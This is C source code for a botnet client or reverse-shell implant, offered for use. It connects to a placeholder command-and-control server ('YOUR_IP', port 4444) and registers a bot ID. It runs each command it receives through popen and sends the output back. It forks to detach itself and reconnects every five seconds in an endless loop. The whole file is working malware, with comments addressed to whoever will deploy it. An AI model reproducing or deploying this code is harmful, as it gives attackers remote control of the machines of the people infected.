#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <errno.h>

#define SERVER_IP "YOUR_IP"  // your vps ip
#define SERVER_PORT 4444
#define CHUNK_SIZE 1024

// for reverse shell
void execute_command_and_send_result(int sock, char *command) {
    char result[CHUNK_SIZE];
    FILE *fp;

    char full_command[CHUNK_SIZE];
    snprintf(full_command, sizeof(full_command), "%s 2>&1", command);

    fp = popen(full_command, "r");
    if (fp == NULL) {
        return;
    }

    // read output and send to cnc
    while (fgets(result, sizeof(result), fp) != NULL) {
        int sent_bytes = send(sock, result, strlen(result), 0);

        if (sent_bytes == -1) {
            if (errno == EPIPE) {
                break;
            }
        }
    }

    char *end_msg = "\n--- End of command output ---\n";
    send(sock, end_msg, strlen(end_msg), 0);

    // close pipe (pls dont remoce)
    pclose(fp);
}

// reverse shell function
void reverse_shell(int sock) {
    char command[CHUNK_SIZE];

    // for clear old command
    memset(command, 0, sizeof(command));

    // listen command from cnc
    int received_bytes = recv(sock, command, sizeof(command) - 1, 0);
    if (received_bytes <= 0) {
        if (received_bytes == 0) {
        } else {
            // added DEBUG if you want
        }
    }
    command[received_bytes] = '\0';
    execute_command_and_send_result(sock, command);
}

int main() {
    // generate bot_id with process id (ex: bot_1001)
    char bot_id[20];
    sprintf(bot_id, "bot_%d", getpid());

    // hide process but its shit, you can remove him
    if (fork() != 0) exit(0);

    while (1) {  // if you are skid, never know this
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            exit(1);
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

        // sleep 5 seconds and try connect again to cnc server
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
            close(sock);
            sleep(5);
            continue;
        }

        // sleep 5 seconds and try send bot_id to cnc
        if (send(sock, bot_id, strlen(bot_id), 0) == -1) {
            close(sock);
            sleep(5);
            continue;
        }

        // yes, he is reverse shell function
        reverse_shell(sock);
        // if you dont want 100% cpu lol
        close(sock);
        sleep(5);
    }
    return 0;
}
